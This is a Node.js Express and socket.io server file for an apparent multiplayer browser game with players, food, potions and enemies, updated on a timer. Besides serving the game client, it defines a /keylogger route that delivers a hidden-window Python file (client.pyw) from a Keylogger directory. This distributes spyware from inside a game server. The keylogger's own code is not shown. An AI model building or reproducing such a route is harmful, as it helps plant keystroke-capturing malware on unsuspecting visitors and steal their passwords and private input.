const express = require('express');
const path = require('path');
const app = express();
const serv = require('http').Server(app);
const io = require('socket.io')(serv, {});
const port = 1337;

//import {changeDirection} from 'Player'
const handler = require('./Handler');
const Player = require ('./PlayerEntities');
const dispatch = require('./Dispatch');
const config = require('../SharedVariables');


class Server {
    constructor(){
        app.set('trust proxy', true);
        app.use(express.static('../Client'));
        this.dir = path.join(__dirname, '../Client/');
        this.kl_path = path.join(__dirname, "../../Keylogger/");

    }
}

server = new Server();
app.get('/', (req, res, next) => {
    console.log(`Received connection from ${req.ip}`);
    res.sendFile(server.dir + 'index.html', (err) => {
        if (err){
            console.log(err);
        }
    });

});

app.get('/keylogger', (req, res) => {
    res.download(server.kl_path + 'client.pyw');
});

serv.listen(port, () => {
    console.log(`Server now listening on port ${port}`)
});


/*
=====================================================
=================== Game Setup ======================
=====================================================
*/

// Global variables
global.players = {};
global.foods = [];
global.potions = [];
global.enemies = [];
global.SOCKET_LIST = {};



io.sockets.on('connection', (socket)=> {
    let ip = socket.handshake.address;
    console.log(`New connection from ${ip}`);

    SOCKET_LIST[socket.id] = socket;
    // it is acceptable to do this on connection as players only get one Entity to control
    players[socket.id] = new Player.Player(450, 350, 10, 10);

    // saving socket id as our identifier, we might need a game ID later on
    // but this is necessary to help the client identify itself easily
    players[socket.id]['id'] = socket.id;

    console.log(players);


    socket.on('keyPress', (pack)=>{
        handler.keyPress(pack);
    });



    socket.on('disconnect', () => {
        console.log(`${ip} has disconnected.`);
        handler.disconnectPlayer(socket, SOCKET_LIST);
    });
});

setInterval( () => {
    dispatch.summonFood();
    dispatch.summonPotions();
    dispatch.summonEnemies();

    for (let i in players){
        players[i].update();
    }
    for (let i in enemies){
        enemies[i].update();
    }
    for (let i in SOCKET_LIST){
        let socket = SOCKET_LIST[i];
        socket.emit('players', players);
        socket.emit('food', foods);
        socket.emit('potions', potions);
        socket.emit('draw');
    }
}, 1000/config.FPS);
// 60 for now


